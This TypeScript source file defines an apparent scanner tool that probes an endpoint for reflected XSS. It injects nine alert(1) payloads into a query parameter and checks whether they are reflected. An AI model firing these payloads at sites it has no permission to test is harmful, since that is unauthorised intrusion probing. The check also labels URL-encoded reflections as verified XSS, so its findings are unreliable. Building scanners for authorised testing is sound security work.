import { Tool, ToolInput, ToolOutput } from '@shared/types/tool';

export const XSSProbeTool: Tool = {
    name: 'xss_probe',
    description: 'Tests an endpoint for Reflected XSS vulnerabilities.',

    async run(input: ToolInput, signal?: AbortSignal): Promise<ToolOutput> {
        const { target, contextParams } = input;
        const base = contextParams?.baseUrl || target;

        const payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '\'><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><svg/onload=alert(1)>',
            'javascript:alert(1)',
            '"><a href="javascript:alert(1)">click</a>',
            '{{constructor.constructor("alert(1)")()}}', // Template XSS
            '"><details open ontoggle=alert(1)>'
        ];

        let requestsMade = 0;
        const findings: string[] = [];
        let vulnerabilityData: any = null;

        for (const payload of payloads) {
            try {
                requestsMade++;
                const url = new URL(target, base);
                url.searchParams.append('q', payload);

                const response = await fetch(url.toString(), { signal });
                const text = await response.text();

                // Logic: A 'real' scanner checks if the exact payload is reflected unsanitized
                if (text.includes(payload) || text.includes(encodeURIComponent(payload))) {
                    findings.push(`Verified Reflected XSS at ${target} via parameter 'q'`);
                    vulnerabilityData = {
                        vulnerability: 'Reflected XSS',
                        payload,
                        evidence: "Payload reflected unsanitized in the response body.",
                        remediation: "Implement robust output encoding and Content Security Policy (CSP)."
                    };
                    break;
                }
            } catch (e: any) {
                console.warn(`[XSSProbe] Request failed for ${target}: ${e.message}`);
            }
        }

        if (findings.length > 0) {
            return { findings, requestsMade, data: vulnerabilityData };
        }

        return {
            findings: [],
            requestsMade,
            data: { status: 'clean', message: 'No Reflected XSS confirmed via network probing.' }
        };
    }
};
